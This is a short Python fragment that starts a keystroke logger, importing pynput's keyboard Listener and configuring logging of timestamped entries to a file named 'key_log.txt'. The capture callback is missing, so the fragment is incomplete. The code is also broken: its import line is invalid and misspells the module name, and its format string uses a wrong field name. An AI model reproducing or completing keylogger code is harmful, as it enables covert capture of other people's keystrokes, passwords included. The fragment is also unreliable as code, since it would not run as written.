import pynput.keboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')